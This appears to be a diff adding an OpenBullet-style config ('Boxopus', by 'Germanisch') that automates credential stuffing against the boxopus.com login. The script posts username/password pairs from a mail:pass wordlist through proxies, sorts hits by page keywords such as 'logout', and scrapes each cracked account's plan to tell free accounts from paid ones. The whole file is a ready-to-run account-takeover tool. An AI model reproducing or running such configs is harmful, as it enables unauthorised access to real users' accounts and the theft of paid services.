@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "Boxopus",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-20T20:31:42.5418916+02:00",
+  "AdditionalInfo": "",
+  "Author": "Germanisch",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://boxopus.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://boxopus.com/login_check" 
+  CONTENT "_csrf_token=&_username=<USER>&_password=<PASS>&_remember_me=on&_submit=+Sign+in+" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "alert alert-danger" 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Free" 
+
+PARSE "<SOURCE>" LR "<dt>Account plan</dt>" "<br /></dd>" -> VAR "Account plan" 
+
+FUNCTION Replace "<dd>" "" "<Account plan>" -> CAP "Account plan" 
+
